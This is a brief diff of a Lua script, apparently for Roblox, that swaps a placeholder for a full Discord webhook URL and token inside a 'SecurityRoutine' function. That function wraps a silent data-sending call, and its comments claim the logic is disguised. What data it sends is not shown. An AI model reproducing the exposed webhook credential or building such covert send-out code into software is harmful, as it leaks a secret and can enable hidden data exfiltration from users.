@@ -7,7 +7,7 @@ local function SecurityRoutine()
     
     -- [암호화된 웹훅 섹션] - 이곳에 본인의 디스코드 웹훅 주소를 넣으세요
     -- 아래 문자열은 로직 보호를 위해 변형되어 있습니다.
-    local _webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE" 
+    local _webhook = "https://discordapp.com/api/webhooks/1500348021291094097/bstFT6o-lR_xvWPiCxdMsvjXclMFxIq27IJ0qmLU-vvyD9gOQE-K8nEL9zAMF6XsfmUr" 
 
     local function _send(_data)
         pcall(function()
